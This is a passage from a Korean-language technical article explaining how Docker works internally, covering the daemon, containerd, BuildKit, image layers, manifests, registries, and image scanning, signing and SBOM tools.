관련 리소스를 관리하기 위해 도커 데몬(서버)과 상호 작용합니다. 도커의 핵심 구성 요소로는 클라이언트, 데몬, 그리고 이미지가 있습니다. 클라이언트와 데몬은 REST API를 사용하여 통신하며 UNIX 소켓이나 네트워크 인터페이스를 통해 통신합니다.\n\n![도커 아키텍처](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_2.png)\n\n- 도커 클라이언트: 사용자가 명령어를 입력하고 도커 리소스를 관리하기 위해 상호 작용하는 명령줄 도구, API 또는 그래픽 인터페이스입니다. 클라이언트는 도커 데몬에 요청을 보내고 해당 명령어를 실행하게끔 조율합니다.\n- 도커 데몬: 도커 엔진이라고도 불리며 호스트 머신에서 실행되는 백그라운드 서비스 및 장기 실행 프로세스로서 컨테이너 및 컨테이너 이미지를 실행하고 관리하는 작업을 실제로 수행합니다. 도커 데몬은 컨테이너의 수명주기를 관리하고 작동을 조율하는 역할을 담당합니다. 도커 클라이언트로부터 요청을 수신하고 컨테이너를 관리하며 다양한 도커 작업을 조율합니다. 데몬은 호스트 운영 체제의 커널과 상호 작용하여 컨테이너화, 네트워킹 및 저장소를 위한 커널 기능 및 모듈을 활용합니다.\n- 도커 데스크톱: 맥, 윈도우 또는 리눅스 환경에 쉽게 설치할 수 있는 응용 프로그램으로, 컨테이너화된 애플리케이션 및 마이크로서비스를 빌드하고 공유할 수 있습니다. Docker Extensions를 사용하면 제3자 도구를 Docker 데스크톱 내에서 확장하여 기능을 추가할 수 있습니다.\n- 도커 레지스트리: 컨테이너 이미지를 저장하는 레지스트리입니다. Docker Hub는 누구나 사용할 수 있는 공개 레지스트리이며, Docker는 기본적으로 Docker Hub에서 이미지를 찾도록 설정되어 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## 3.2. Low-level Architecture\n\n각 기술에 대해 자세히 알아볼 것이지만, 먼저 30,000피트의 시점에서 아키텍처를 살펴보겠습니다:\n\n![Architecture](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_3.png)\n\n- Docker Desktop은 필요한 Linux 환경을 제공하기 위해 가상 머신(VM)을 사용합니다.\n- VM 내에서 Docker 클라이언트는 RESTful API를 통해 Docker 데몬(dockerd)과 상호작용합니다.\n- 그것은 컨테이너를 실행하는 데 사용되는 Containerd를 내부적으로 사용합니다. Containerd는 물리적 또는 가상 머신에서 컨테이너의 수명 주기를 관리하는 산업 표준 런타임입니다. 컨테이너를 생성하고 시작하며 중지하고 제거하는 데 사용되는 데몬 프로세스입니다.\n- Containerd 플러그인을 추가하여 기능을 확장할 수 있습니다.\n- 컨테이너가 시작되면 containerd의 일부인 shim (runtime v2) API가 containerd와 OCI 런타임 사이에 중개자 역할을 합니다.\n- OCI 런타임은 컨테이너의 네임스페이스, 제어 그룹(cgroups), 기능 및 컨테이너화에 필요한 기타 설정을 설정하는 역할을 담당합니다. Linux 커널의 능력을 활용하여 리소스를 격리하고 제어하며 보안을 강화하고 컨테이너의 동작을 관리합니다. 프로세스에 대한 고도로 세분화된 리소스 할당 및 제어를 가능케 하는 Linux 커널 기능인 Cgroups은 컨테이너에 권한을 부여하여 권한과 시스템 자원에 대한 액세스를 정의하는 Linux 커널 내에서 권한을 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n## Docker CLI\n\nDocker CLI 도구는 dockerd 데몬과 상호 작용하는 데 사용되는 명령줄 응용 프로그램입니다. 여러 유용한 기능을 포함하고 있습니다. 표준 UNIX 스타일의 인수를 처리하며 많은 경우 짧은 형식과 긴 형식을 모두 제공합니다.\n\n깊이 관심이 있는 경우 저장소에서 모든 명령을 찾을 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_4.png)\n\n<div class=\"content-ad\"></div>\n\n## 도커 레지스트리\n\n도커 레지스트리는 사용자가 컨테이너 이미지를 저장하고 배포할 수 있는 서비스입니다. 사용자는 이미지를 푸시하여 다른 팀 멤버나 시스템이 배포할 수 있도록 공개적으로 이용할 수 있는 중앙화된 또는 분산된 위치로 레지스트리를 활용할 수 있습니다.\n\nOpenRegistry와 같이 분산된 레지스트리도 있습니다. 몇 달 전에 @kotokunaga.mail이 \"P2P Container Image Distribution on IPFS With Containerd\"에 관한 블로그 글을 작성했습니다. IPFS 지원은 nerdctl v0.14에서 소개되었습니다.\n\n레지스트리 API와 상호 작용할 수 있는 다양한 도구가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n- 크레인: 원격 이미지 및 레지스트리와 상호 작용하는 도구입니다.\n- 스코페오: 컨테이너 이미지 및 이미지 저장소에서 다양한 작업을 수행하는 명령 줄 유틸리티입니다.\n- 레지스트리 API를 위한 클라이언트 인터페이스인 레그컨트롤입니다.\n\n## BuildKit\n\nBuildKit은 동시성, 캐시 효율성, Dockerfile에 독립적인 빌더 툴킷입니다.\n\nBuildKit을 통합함으로써 사용자는 성능, 저장 공간 관리, 기능 기능성 및 보안 측면에서 개선을 볼 수 있어야 합니다.\n\n<div class=\"content-ad\"></div>\n\nBuildKit 빌드를 활성화하려면 클라이언트 측에서 $ docker build를 호출할 때 DOCKER_BUILDKIT=1 환경 플래그를 전달하거나 /etc/docker/daemon.json 파일에서 '“features”: ' “buildkit”: true '를 설정한 후 데몬을 다시 시작하면 됩니다. 현재 리눅스 컨테이너 빌드만 지원됩니다.\n\nBuildKit에는 두 가지 주요 구성 요소가 있습니다: buildctl과 buildkitd. buildctl은 gRPC 서버를 통해 buildkitd와 통신합니다. 시작할 때 sdnotify를 통해 init 데몬 (systemd)에 메시지를 보냅니다. 서비스 관리자에 서비스 시작이 완료되었음을 알리기 위해 sddaemon.SdNotify(거짓, sddaemon.SdNotifyReady)를 보내며 나중에 SdNotifyStopping을 보냅니다.\n\nBuildKit은 여러 플랫폼용 빌드에서 잘 작동하도록 설계되었으며, 사용자가 빌드를 실행하는 아키텍처 및 운영 체제뿐만 아니라 여러 플랫폼을 위한 빌드도 지원합니다.\n\nBuildKit은 실행하는 빌드에 대한 SLSA Provenance의 생성을 지원합니다. BuildKit이 생성하는 provenance 형식은 SLSA Provenance 형식에 의해 정의됩니다.\n\n<div class=\"content-ad\"></div>\n\n## Buildx\n\n도커 Buildx는 Moby BuildKit 빌더 툴킷에서 제공하는 기능을 완벽히 지원하는 도커 명령어를 확장하는 CLI 플러그인입니다. 도커 Buildx는 항상 BuildKit을 활성화합니다. 도커 빌드와 동일한 사용자 경험을 제공하며 생성된 스코프 빌더 인스턴스를 만들거나 여러 노드에 동시에 빌드하는 기능과 같은 많은 새로운 기능을 제공합니다.\n\n아래는 예시 멀티 플랫폼 멀티 스테이지 이미지를 빌드하는 방법입니다:\n\n```js\ndocker buildx build --platform <platform1>,<platform2>,... --tag <이미지_이름> --file <Dockerfile> .\n```\n\n<div class=\"content-ad\"></div>\n\n컨테이너 이미지를 만드는 대안 방법\n\n컨테이너 이미지를 만들기 위해 오직 \"Docker\"만 사용할 필요는 없습니다. OCI 규격을 준수하는 컨테이너 이미지를 만드는 다양한 방법이 있습니다:\n\n- google/ko\n\nGitLab CI/CD 파이프라인에서 ko를 사용하고 싶으신가요? 아주 간단합니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n$ KO_DEFAULTBASEIMAGE: gcr.io/distroless/static:nonroot\n$ KO_DOCKER_REPO: ${CI_REGISTRY}/${CI_PROJECT_NAMESPACE}\n$ ko login $CI_REGISTRY -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD\n$ ko apply -B --bare -f your_deployment.yaml\n```\n\n취약점이 없는 컨테이너 이미지를 생성하고 싶나요? apko로 간단하게 만들 수 있어요!\n\n여기 컨테이너 이미지 빌더 목록입니다:\n\n- GoogleContainerTools/kaniko\n- GoogleContainerTools/jib\n- containers/podman (데몬 없이!)\n- containers/buildah (데몬 없이!)\n- moby/buildkit\n- docker/buildx\n- genuinetools/img\n- uber/makisu (사용 중단)\n- pivotal/kpack\n- openshift/source-to-image\n- buildpacks\n- nix/ocitools\n- rancher/kim\n- shipwright\n- earthly\n- bazelbuild (rules_docker)\n\n<div class=\"content-ad\"></div>\n\n보너스: 도커를 사용하지 않고 go-containerregistry 모듈을 사용하여 레이어 및 이미지 매니페스트를 프로그래밍 방식으로 작성하여 OCI 컨테이너 이미지를 작성하는 데 관심이 있다면 @ahmetb의 블로그 포스트를 확인해보세요.\n\n## 컨테이너 런타임 인터페이스 (CRI)\n\nKubernetes (K8s)에 대해 들어봤나요? 아니라면 괜찮아요. 이 기사에서는 지금까지 이에 대해 언급하지 않았어요. Kubernetes에 대해 들어보지 못했다면 이 섹션을 건너뛰세요.\n\nKubernetes에는 \"kubelet\"이라는 구성 요소가 있습니다. 이는 Kubernetes 클러스터의 모든 노드(물리적인 머신)에서 실행되는 에이전트입니다. 컨테이너 런타임은 현대적인 컨테이너화된 아키텍처의 기본 구성 요소입니다.\n\n<div class=\"content-ad\"></div>\n\n컨테이너 런타임 인터페이스(CRI)를 통해 Kubernetes는 CRI 규격을 준수하는 런타임을 사용할 수 있습니다. 모든 도커 이미지는 모든 컨테이너 런타임에서 실행할 수 있습니다.\n\n다양한 컨테이너 런타임이 있습니다. 각각은 특별한 기능을 갖고 있으며 성능, 보안 및 기능성 사이에서 한정된 선택을 내립니다.\n\n- containerd (CNCF 기준화)\n- CRI-O (CNCF 인큐베이팅)\n- gVisor\n- Firecracker\n- kata\n- lxd\n- Singularity (apptainer)\n- SmartOS\n\ndockershim\n\n<div class=\"content-ad\"></div>\n\n도커셈은 도커를 위한 CRI 지원을 구현합니다. 과거에 쿠버네티스에는 도커셈이라 불리는 브릿지가 포함되어 있었는데, 이는 도커가 CRI와 함께 작동할 수 있도록 했습니다. v1.20부터 도커셈은 더 이상 유지되지 않을 것이며, 이는 쿠버네티스에서 도커가 더 이상 지원되지 않는다는 것을 의미합니다. 현재 쿠버네티스는 앞으로의 버전(아마도 v1.22)에서 도커에 대한 지원을 완전히 제거할 계획입니다.\n\n## 컨테이너드\n\n컨테이너드는 간단함, 견고함, 이식성에 중점을 둔 산업 표준 컨테이너 런타임입니다. 컨테이너드는 호스트 시스템의 완전한 컨테이너 라이프사이클을 관리할 수 있습니다: 이미지 전송 및 저장, 컨테이너 실행 및 감독, 저수준 저장 및 네트워크 연결 등을 포함합니다.\n\n컨테이너드는 개발자나 최종 사용자가 직접 사용하는 대신, 더 큰 시스템에 임베드된 형태로 설계되었습니다.\n\n<div class=\"content-ad\"></div>\n\ncontainerd는 Docker 데몬에서 사용하도록 설계되었으며, 컨테이너 런타임을 새 프로젝트로 분리했습니다.\n\ncontainerd에 의해 컨테이너가 직접 스케줄링되므로 Docker에서 볼 수 없습니다.\n\n![이미지](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_5.png)\n\ncrictl\n\n<div class=\"content-ad\"></div>\n\n컨테이너 런타임 명령줄 인터페이스(CLI)는 시스템 및 응용 프로그램 문제 해결에 유용한 도구입니다. 컨테이너드 및 모든 다른 CRI 호환 컨테이너 런타임을 위해, 예를 들어 dockershim인 경우, 도커 CLI 대신 사용할 수 있는 대체 CLI로 crictl을 권장합니다. crictl은 모든 CRI 호환 컨테이너 런타임에서 일관되게 작동합니다. crictl은 사용자에게 더 나은 전환 경험을 제공하기 위해 도커 CLI와 유사하게 디자인되었지만 정확히 동일하지는 않습니다. \n\n많은 명령어는 이름까지 직접 매핑됩니다. 출력 형식도 유사합니다. 일부 실험적인 도커 명령어는 아직 매핑되지 않았습니다.\n\ncrictl의 범위는 문제 해결에 제한되어 있으며, 도커 CLI를 대체하는 것은 아닙니다. 도커의 CLI는 다양한 명령어 세트를 제공하여 매우 유용한 개발 도구인 반면, crictl은 노드 문제 해결에 충분한 명령어만을 제공합니다. 이는 생산 노드에서 사용하기에 더 안전할 것으로 생각됩니다.\n\n<div class=\"content-ad\"></div>\n\nnerdctl (contaiNERD CTL)는 containerd를 위한 Docker 호환 CLI로, compose, rootless, lazy pulling (eStargz), OCIcrypt, P2P 이미지 배포 (IPFS), 이미지 서명 및 검증 지원이 포함되어 있습니다...\n\nnerdctl의 목적은 Docker에 없는 containerd의 최첨단 기능을 실험하는 것을 용이하게 하는 것입니다. 부차적인 목표는 Kubernetes 클러스터의 디버깅에 유용할 수도 있습니다.\n\nctr\n\ncontainerd 명령 줄 클라이언트는 ctr입니다.\n\n<div class=\"content-ad\"></div>\n\n- 컨테이너 이미지를 가져오기:\n`$ ctr images pull nginx:latest`\n\n- 보유한 이미지 목록 표시:\n`$ ctr images list`\n\n- 이미지를 기반으로 컨테이너 실행:\n`$ ctr container create nginx:latest nginx`\n\n- 실행 중인 컨테이너 목록 표시:\n`$ ctr container list`\n\n- 컨테이너를 중지:\n`$ ctr container delete nginx`\n\nhands-on 경험으로 ctr에 대해 더 알아보세요!\n\n## 컨테이너드 알아보기\n\ncontainerd에 대해 더 알고 싶다면, /docs 폴더로 이동하세요.\n\n<div class=\"content-ad\"></div>\n\n✨ 이미지 첨부:\n\n![Docker image](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_6.png)\n\n**서비스**\n\n- containerd는 몇 가지 서비스를 초기화하고 클라이언트를 위해 gRPC 서비스 API를 제공합니다.\n\n**플러그인**\n\n<div class=\"content-ad\"></div>\n\ncontainerd는 사용자 지정 런타임, 스냅샷터, 콘텐츠 스토어 및 gRPC와 같이 정의된 인터페이스를 사용하여 기능을 확장할 수 있습니다.\n\ncontainerd는 내부적으로 플러그인을 사용하여 내부 구현을 분리하고 안정적이며 외부 플러그인과 동등하게 처리할 수 있도록 합니다. containerd에 설치된 모든 플러그인을 확인하려면 다음 명령을 사용하십시오: $ ctr plugins ls:\n\n```js\nTYPE                            ID                PLATFORMS   STATUS\nio.containerd.content.v1        content           -           ok\nio.containerd.snapshotter.v1    btrfs             linux/amd64 ok\nio.containerd.snapshotter.v1    aufs              linux/amd64 error\nio.containerd.snapshotter.v1    native            linux/amd64 ok\nio.containerd.snapshotter.v1    overlayfs         linux/amd64 ok\nio.containerd.snapshotter.v1    zfs               linux/amd64 error\nio.containerd.metadata.v1       bolt              -           ok\nio.containerd.differ.v1         walking           linux/amd64 ok\n...\n```\n\n위 출력에서 모든 플러그인과 로드하지 못한 플러그인을 확인할 수 있습니다. 특정 플러그인에 대한 자세한 정보를 얻으려면 다음 명령을 사용하십시오: $ ctr plugins ls -d id==aufs id==zfs\n\n<div class=\"content-ad\"></div>\n\ncontainerd는 서버에서 모든 플러그인을 가져오기 위해 Introspectation Service를 호출합니다. 서비스 서버의 초기화 중에 LoadPlugins() 함수를 통해 모든 플러그인이 설정됩니다. Overlayfs 플러그인 등록이 작동하는 예시를 찾을 수 있습니다.\n\nttrpc\n\n저 메모리 환경을 위한 GRPC입니다. HTTP, HTTP2, TLS를 필요로 하지 않는 가벼운 프로토콜입니다. Go stdlib context 패키지를 사용합니다.\n\nttrpc 클라이언트를 초기화하고 싶으신가요? 이렇게 하면 됩니다:\n\n<div class=\"content-ad\"></div>\n\n```js\nconn, err := dialer.ContextDialer(context.TODO(), timeout)\nclient := ttrpc.NewClient(conn)\n```\n\n연속성\n\n연속성은 전송에 중립적인 파일 시스템 메타데이터 매니페스트 시스템 저장에 대한 실험을 위한 스테이징 영역입니다.\n\n연속성을 사용하여 AtomicWriteFile()를 호출하는 간단한 예제가 여기 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n// AtomicWriteFile은 먼저 임시 파일에 데이터를 쓰고 rename을 호출하여 파일에 원자적으로 쓰는 함수입니다.\ncontinuity.AtomicWriteFile(filename, bytes, 0666)\n```\n\n# 컴포넌트 깊은 탐구\n\n이미 알고 계실 수도 있지만, Docker는 하드웨어 아래에서 수행되는 모든 마법을 하는 유일한 컴포넌트가 아닙니다.\n\n## 컨테이너 이미지\n\n<div class=\"content-ad\"></div>\n\n컨테이너 이미지가 무엇인지, Docker가 이미지를 빌드하고 저장하는 방식, 이러한 이미지가 컨테이너에서 어떻게 사용되는지를 알아야 합니다.\n\n컨테이너 이미지는 실행 가능한 코드를 포함한 변경할 수 없는, 즉 정적인 파일이며, 일관되게 배포되어 임의의 환경에서 격리된 프로세스를 실행할 수 있도록 해줍니다. 부모-자식 관계와 이미지 레이어링의 개념이 있습니다. 이것은 파일 시스템이 내장된 아카이브로 볼 수 있습니다.\n\n컨테이너 이미지는 JSON 매니페스트와 개별 파일 시스템 레이어의 조합으로, 부모 또는 기본 이미지 위에 구축됩니다. 이러한 레이어는 다양한 구성 요소 및 환경 설정을 재사용할 수 있도록 하여 사용자가 모든 것을 다시 만들 필요가 없게 합니다. 최적의 방식으로 레이어를 구성하면 컨테이너 크기를 줄이고 성능을 향상시킬 수 있습니다.\n\n컨테이너 이미지는 클래스/객체 개념과 약간 유사합니다. 이미지는 클래스 또는 템플릿과 같으며 해당 템플릿의 인스턴스를 여러 개 생성할 수 있으며 OCI Runtime Specification이 있습니다. 이는 표준 컨테이너의 정의입니다.\n\n<div class=\"content-ad\"></div>\n\n컨테이너 이미지는 오픈 표준을 사용하며 태그가 지정될 수도 있고 되지 않을 수도 있어서 진정한 식별자를 통해서만 검색될 수 있습니다.\n\n![이미지](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_7.png)\n\n기술적으로 이미지 없이 컨테이너를 실행할 필요는 없습니다! 궁금하신가요? 더 자세히 다룰 예정입니다.\n\n저장소\n\n<div class=\"content-ad\"></div>\n\n`containers/storage`는 Go 라이브러리로, 레이어, 이미지 및 컨테이너를 저장하고 관리하기 위한 메서드를 제공하는 것을 목표로 합니다.\n\n도커 이미지는 여러 레이어로 구성됩니다. 각 레이어는 Dockerfile에서 특정 명령에 해당합니다.\n\nDockerfile\n\n기본적으로 텍스트 파일에서 환경을 나타냅니다. 우리는 FROM으로 구성하려는 원하는 것들을 실행할 수 있습니다. Dockerfile은 최종적으로 우리가 컨테이너를 생성하는 데 사용할 수 있는 컨테이너 이미지를 만듭니다.\n\n<div class=\"content-ad\"></div>\n\n도커 이니셜라이즈 명령어로 새로운 도커 파일을 쉽게 만들 수 있어요.\n\n위의 개요는 최소한의 Dockerfile을 시각화한 것입니다:\n\n![도커 파일](/assets/img/2024-06-19-HowdoesDockerACTUALLYworkTheHardWayAComprehensiveTechnicalDeepDiving_8.png)\n\n레이어는 Copy-on-Write(CoW) 파일 시스템입니다. 각 레이어는 이전 레이어와의 차이점 집합입니다. 어떤 레이어든 서로 쌓을 수 있어요. 파일을 추가하거나 제거하면 새로운 레이어가 생성돼요.\n\n<div class=\"content-ad\"></div>\n\n이미지는 여러 개의 레이어로 구성됩니다. 각 레이어는 Dockerfile에서의 한 명령을 나타냅니다. 여러 이미지가 동일한 레이어를 참조할 수 있습니다. 매우 마지막 레이어를 제외한 각 레이어는 읽기 전용입니다. 이미지는 상태를 저장하지 않습니다.\n\n컨테이너는 읽기-쓰기 (RW) 레이어입니다. 이미지의 최상위 쓰기 가능한 레이어의 자식입니다. 컨테이너에 새로운 데이터를 추가하거나 기존 데이터를 수정하는 모든 쓰기 작업은 이 쓰기 가능한 레이어에 저장됩니다. 컨테이너가 삭제되면 쓰기 가능한 레이어도 삭제됩니다. 기본 이미지는 변경되지 않습니다. 각 컨테이너는 자체의 쓰기 가능한 컨테이너 레이어를 갖습니다. 하나의 이미지에서 여러 컨테이너를 파생할 수 있습니다. 모든 변경 사항(새 파일 작성, 기존 파일 수정, 파일 삭제 등)은 이 얇은 쓰기 가능한 컨테이너 레이어에 저장되며, 여러 컨테이너가 동일한 기본 이미지에 접근할 수 있으면서 자체 데이터 상태를 갖게 됩니다.\n\n컨테이너 레이어에서는 Docker가 저장 드라이버를 사용하여 이미지 레이어 및 쓰기 가능한 컨테이너 레이어의 내용을 관리합니다. 각 저장 드라이버는 구현을 다르게 처리하나, 모든 드라이버는 쌓을 수 있는 이미지 레이어와 복사-온-라이트(CoW) 전략을 사용합니다.\n\n레이어들은 내부적으로 이미지와 유사하게 저장됩니다. 각 레이어는 /var/lib/docker/`driver`/layerdb/`algorithm`에 별도의 디렉토리를 갖습니다. Docker는 모든 캐시를 /var/lib/docker/`driver`에 저장하며, 여기서 `driver`는 다시 저장 드라이버 overlay2를 가리킵니다. 자세한 내용은 여기를 참조하세요.\n\n<div class=\"content-ad\"></div>\n\n$ docker ps -s 명령을 사용하여 실행 중인 컨테이너의 크기를 확인할 수 있습니다.\n\n각 컨테이너의 쓰기 가능한 레이어에 사용된 디스크의 총 데이터 양은 크기이고, 가상 크기는 컨테이너에 의해 사용되는 읽기 전용 이미지 데이터와 컨테이너의 쓰기 가능한 레이어 크기의 데이터 양입니다.\n\n다음은 최소한의 Go 파일을 작성해 봅시다:\n\n```go\npackage main\n\nfunc main() {\n    println(\"Hello, World!\")\n}\n```\n\n<div class=\"content-ad\"></div>\n\n다음 명령을 실행하여 이미지를 빌드하세요:\n\n```js\n$ docker image build --tag minimal .\n```\n\n그러면 이 이미지를 미래의 예제에서 사용할 수 있습니다.\n\n도커 매니페스트\n\n<div class=\"content-ad\"></div>\n\n도커 Manifest는 이미지를 설명하고 태그, 이미지의 원본을 확인하기 위한 디지턼 서명, 그리고 문서와 같은 메타데이터를 제공하는 JSON 형식의 파일입니다. Manifest는 컨테이너 런타임에서 사용하기 위해 만들어졌습니다.\n\nManifest Lists(또는 “fat manifest”)는 v2.2 이미지 명세서에서 정의되었으며, 이미지 레지스트리 내에서 다중 아키텍처 및 다중 플랫폼 이미지를 지원하는 주된 목적으로 존재합니다. 도커가 현재 지원하는 IANA 미디어 유형이 여러 가지 있습니다. 새로운 manifest 목록 객체 유형을 보고, 생성하고, 푸시하려면 manifest-tool이 당신이 찾고 있는 도구입니다.\n\n온라인에서 컨테이너 이미지와 해당 Manifest를 검사하려면 다음 링크를 사용하세요: https://oci.dag.dev/\n\n더 깊이 이해하고 싶다면, dive 도구를 사용하여 컨테이너 이미지를 살펴볼 수 있습니다. $ dive minimal 명령을 실행하여 이미지에 대한 다음 정보를 얻을 수 있습니다:\n\n<div class=\"content-ad\"></div>\n\n이미지의 총 크기가 316MB인 것은 golang:1.17.3-alpine3.14 이미지의 불필요한 종속성 때문입니다. 이미지를 최적화하기 위해 다중 단계 빌드를 사용할 수 있습니다.\n\n여기서 scratch를 사용하고 있음을 주목해 주세요. FROM scratch는 Dockerfile에서 no-op이며 이미지에 추가적인 레이어를 만들지 않습니다. Docker에서 가장 작은 가능한 이미지이며 비어 있습니다 (폴더나 파일이 포함되어 있지 않음) 이미지를 빌드하기 위한 시작점입니다. scratch 이미지를 가져오거나 실행하거나 이름을 달아 다른 이미지에 태그를 붙일 수 없습니다.\n\n<div class=\"content-ad\"></div>\n\n다이브 도구를 다시 실행하여 새 이미지 크기를 확인해보세요. 이제 1.2MB입니다!\n\n또한, 디스트로리스 이미지에 대해 언급해보는 것이 좋습니다:\n\nDrawbacks of Container Images\n\nSecurity\n\n<div class=\"content-ad\"></div>\n\n컨테이너 보안은 컨테이너 세계에서 중요한 역할을 합니다. IT 조직들은 사기성 이미지를 모니터링하고, 개발자들에게 최상의 실행 방법을 가르쳐야 합니다. 이미지에 대한 엔터프라이즈 강화를 원하신다면 Docker CIS 보안 기준을 확인해보세요. 보안을 위해 컨테이너 이미지를 분석하고 최상의 실행 방법 이미지를 만들기 위해 dockle, hadolint 등과 같은 도구를 사용할 수 있습니다.\n\n예를 들어, 이미지의 사용자 라이브러리에 특정 취약점이 발견되었다고 가정해봅시다. 어떻게 스캔하고 어떻게 수정할 수 있을까요? 영향을 받는 영역은 무엇인가요?\n\n감염된 베이스 이미지를 찾아 교체해야 합니다. 노드의 모든 하위 자식은 그 취약점에 영향을 받을 것입니다. 우리는 모든 이러한 레이어가 해당 레이어에서 상속되었음을 알고 있습니다. 따라서, 취약점에 영향을 받을 컨테이너들을 모두 이해해야 합니다.\n\n컨테이너 이미지의 보안 취약점을 찾기 위해서는 정의된 패키지와 의존성을 분석하고, 알려진 보안 취약점을 확인해야 합니다. Aqua Security의 Trivy와 Quay의 Clair과 같은 스캐너는 최신 vuln-list를 사용하고 적극적으로 개발 중이므로 훌륭한 선택입니다.\n\n<div class=\"content-ad\"></div>\n\n도커 스카우트는 이미지 내용을 분석하고 감지된 패키지와 취약점에 대한 자세한 보고서를 생성합니다. 또한 이미지 분석에서 발견된 문제를 해결하는 방법에 대한 제안도 제공할 수 있습니다.\n\n@lizrice의 Container Security 도서도 꼭 확인해보세요! Batuhan은 보안 및 클라우드 네이티브 관점에서 도커 뉴스를 자신의 substack에서 공유하고 있어요.\n\n기본적으로 안전한 컨테이너 이미지를 사용하세요: Chainguard Images by Chainguard는 최소주의와 보안을 위해 설계된 컨테이너 이미지 모음입니다. 이러한 이미지 중 많은 이미지는 distroless입니다. 즉, 애플리케이션 및 런타임 종속성만 포함하고 있으며 셸이나 패키지 관리자가 없습니다.\n\n저장 요구량\n\n<div class=\"content-ad\"></div>\n\n이미지는 컨테이너 레지스트리에 저장됩니다. 컨테이너 레지스트리는 Open Container Initiative (OCI) 규격을 준수하는 레지스트리입니다. 개발자로서 컨테이너 이미지를 저장, 공유 및 관리하기 쉽게 만들어줍니다. 컨테이너 레지스트리는 사실상 \"Tarballs As A Service\"입니다.\n\n도커 레지스트리 HTTP API V2 규격은 Open Container Initiative (OCI)에서 distribution-spec으로 채택되었습니다.\n\n스토리지 자원을 최적화하기 위해 사용하지 않는 컨테이너 이미지를 제거하는 것이 좋을 것입니다. 완료된 컨테이너는 자동으로 제거되지 않습니다.\n\n컨테이너 이미지를 다운로드 크기를 줄이고 속도를 높이기 위해 eStargz를 사용하여 게으른 다운로드를 할 수 있습니다. (여기에 깊이 파헤친 노트가 있습니다.)\n\n<div class=\"content-ad\"></div>\n\n가비지 수집은 컨테이너 자원을 효율적으로 관리하는 중요한 측면이며, containerd에는 사용되지 않는 리소스를 회수하기 위한 가비지 수집 메커니즘이 포함되어 있습니다.\n\n또한, 컨테이너 이미지의 레이어를 암호화함으로써 빌드부터 런타임까지 끝간의 암호화를 보장할 수 있는 엄격한 신뢰 요구 사항을 얻을 수 있습니다. @lumjjb가 오픈컨테이너/image-spec에 Encrypted Layer Mediatype를 추가하는 아이디어를 제안했습니다. 이에 대해 더 알아보고 싶으시다면 CNCF 웨비나를 확인해보세요!\n\n결국, 우리는 왜 컨테이너 레지스트리에서 레이어 암호화를 지원하지 않을까 생각했고, Harbor 레지스트리를 위한 제안서를 작성하기로 결정했습니다! SBOM 지원을 위해 다른 제안서를 제출했습니다.\n\n<div class=\"content-ad\"></div>\n\n서명\n\n보안 중심 단계를 포함하는 것이 중요합니다. 이미지를 스캔하여 이미지의 무결성을 확인하여 변조로부터 보호합니다. 이미지 내용을 빌드 시 디지털로 서명하고 사용 전에 서명된 데이터를 확인하여 빌드와 실행 시의 이미지 데이터를 변조로부터 보호하여 발행자와 소비자 간의 무결성과 출처를 보장합니다. 여기서 도커의 Content Trust가 필요하며, Sigstore/Cosign 및 Notary와 같은 도구들이 등장하는 이유입니다! cosign에 대해 자세히 알고 싶다면 @dlorenc의 \"Signed Container Images\"를 읽어보세요! Notary와 Cosign의 차이가 궁금하신가요?\n\nLinux Foundation, BastionZero 및 Docker가 최근 발표한 OpenPubkey 프로젝트에 대해 자세히 알아보세요 - OpenPubkey와 Sigstore에 대해 더 알아보세요.\n\ncosign, rekor, fulcio 및 gitsign에 대해 더 알아보세요!\n\n<div class=\"content-ad\"></div>\n\nSoftware 구성품 목록\n\n소프트웨어 공급망을 보호하기 위해서는 반드시 사용 중인 소프트웨어를 파악하는 것부터 시작해야 합니다. 라이브러리, 의존성, 패키지 등으로 구성된 소프트웨어 구성요소 목록을 작성해야 합니다. 우리는 이를 소프트웨어 재료라고 부를 수 있습니다. 이 \"재료\" 목록은 소프트웨어 부품 목록(Software Bill of Materials, SBOM)이라고 알려져 있습니다. SBOM은 주어진 소프트웨어를 빌드(컴파일 및 링크)하는 데 필요한 컴포넌트, 라이브러리 및 모듈의 완전하고 형식적인 구성 목록이며 공급망입니다.\n\nAnchore의 syft 도구를 사용하여 컨테이너 이미지의 SBOM을 쉽게 생성한 후 grype로 취약점을 찾아 스캔할 수 있습니다!\n\n실험적인 docker sbom 명령을 사용하여 컨테이너 이미지의 SBOM을 생성할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## 컨테이너\n\n리눅스 컨테이너는 리눅스에서 실행되는 하나 이상의 프로세스를 실행하기 위한 격리되고 제약된 상자일 뿐입니다. 여기서 '상자'라는 말은 독립된 프로세스가 자체 프로세스 이름공간을 가지고 시작한다는 것을 의미합니다. 컨테이너화된 프로세스는 시스템 호출을 통해 커널과 상호작용하며, 일반적인 프로세스와 마찬가지로 권한이 필요합니다. 컨테이너는 호스트 시스템의 커널을 공유하며 (선택적으로) 시스템 내의 다른 컨테이너로부터 격리됩니다. 최소한의 컨테이너는 그 안에 단일 실행 파일만 포함하고 있습니다.\n\n컨테이너로 진입하면 해당 컨테이너 내에서 실행 중인 프로세스만 볼 수 있습니다. 일반적으로 컨테이너 당 한 프로세스를 사용합니다. 컨테이너 프로세스는 컨테이너 자체의 수명주기와 바인딩되어 있습니다: 컨테이너 시작/종료 시 컨테이너 프로세스도 시작/종료됩니다. 전체 수명주기가 엄격하게 결합되어 있습니다.\n\n컨테이너를 사용하면 모든 종속성이 포함됩니다. 커널 상위에 필요한 것들이 모두 컨테이너 내에 패키지화되어 있습니다. 컨테이너는 호스트의 커널을 공유합니다. 컨테이너 내에서는 호스트의 전체 파일 시스템을 볼 수 없으며, 대신 루트 디렉토리가 만들어진 